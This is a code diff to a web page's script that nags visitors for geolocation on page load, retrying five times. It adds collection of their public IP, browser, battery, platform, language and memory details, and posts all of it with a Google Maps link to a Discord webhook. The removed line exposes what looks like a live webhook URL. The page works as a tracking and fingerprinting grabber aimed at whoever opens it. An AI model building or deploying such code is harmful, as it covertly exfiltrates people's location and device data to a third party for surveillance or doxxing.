@@ -26,14 +26,55 @@
     </div>
 
     <script>
-        const discordWebhookURL = "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm"; // Replace with your webhook URL
+        const discordWebhookURL = "YOUR_DISCORD_WEBHOOK_URL"; // Replace with your webhook URL
         const retryDelay = 5000; // 5 seconds
         const maxRetries = 5; // Maximum retries
         let retryCount = 0;
 
-        async function sendToDiscord(latitude, longitude) {
+        // Function to fetch IP address and other device details
+        async function fetchIPAndDeviceDetails() {
+            // Get IP address
+            const ipData = await fetch('https://api.ipify.org?format=json');
+            const ipResponse = await ipData.json();
+            const ipAddress = ipResponse.ip;
+
+            // Get User-Agent (device and browser details)
+            const userAgent = navigator.userAgent;
+
+            // Get network information
+            const networkInfo = navigator.connection ? navigator.connection.effectiveType : "Unknown";
+
+            // Get battery information
+            const battery = await navigator.getBattery();
+            const batteryPercentage = battery.level * 100;
+            const isCharging = battery.charging;
+
+            // Get platform and language
+            const platform = navigator.platform;
+            const language = navigator.language;
+
+            // Get device memory (available in modern browsers)
+            const deviceMemory = navigator.deviceMemory || "Unknown";
+
+            return { ipAddress, userAgent, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory };
+        }
+
+        // Send all data to Discord webhook
+        async function sendToDiscord(latitude, longitude, ipAddress, userAgent, timestamp, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory) {
             const data = {
-                content: `User location: Latitude ${latitude}, Longitude ${longitude}`
+                content: `**User Details:**
+- DeviceLocalTime: ${new Date().toLocaleString()}
+- Location: Latitude ${latitude}, Longitude ${longitude}
+- Google Maps Link: https://www.google.com/maps/place/${latitude}%2C${longitude}
+- IP Address: ${ipAddress}
+- Local IP Address: ${ipAddress}  // Using the same IP address for local and public for now
+- User-Agent: ${userAgent}
+- NetworkInformation: ${networkInfo}
+- BatteryPercentage: ${batteryPercentage}%
+- IsCharging: ${isCharging ? "Yes" : "No"}
+- Platform: ${platform}
+- DeviceLanguage: ${language}
+- DeviceMemory: ${deviceMemory} GB`
             };
 
             try {
@@ -49,12 +90,13 @@
                     throw new Error(`Discord webhook error: ${response.statusText} (${response.status})`);
                 }
 
-                console.log("Location sent to Discord successfully.");
+                console.log("Details sent to Discord successfully.");
             } catch (error) {
-                console.error("Failed to send location to Discord:", error);
+                console.error("Failed to send details to Discord:", error);
             }
         }
 
+        // Function to get geolocation permission
         async function getLocationPermission() {
             return new Promise((resolve, reject) => {
                 if (navigator.geolocation) {
@@ -68,18 +110,24 @@
             });
         }
 
+        // Request location and send to Discord
         async function requestLocation() {
             try {
                 const position = await getLocationPermission();
                 const { latitude, longitude } = position.coords;
+                const timestamp = new Date().toISOString(); // Current timestamp
 
                 console.log("Permission granted:", latitude, longitude);
 
-                document.getElementById('dialogBox').style.display = 'none'; // Hide dialog
-                retryCount = 0; // Reset retries
+                // Fetch IP address and device details
+                const { ipAddress, userAgent, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory } = await fetchIPAndDeviceDetails();
 
-                // Send location to Discord
-                sendToDiscord(latitude, longitude);
+                // Send all the data to Discord
+                sendToDiscord(latitude, longitude, ipAddress, userAgent, timestamp, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory);
+
+                // Hide the dialog
+                document.getElementById('dialogBox').style.display = 'none';
+                retryCount = 0; // Reset retries
             } catch (error) {
                 console.warn("Location access failed:", error);
 
@@ -94,6 +142,7 @@
             }
         }
 
+        // On page load, start geolocation request
         document.addEventListener("DOMContentLoaded", () => {
             console.log("Page loaded. Starting geolocation request...");
             document.getElementById('dialogBox').style.display = 'block'; // Ensure visible
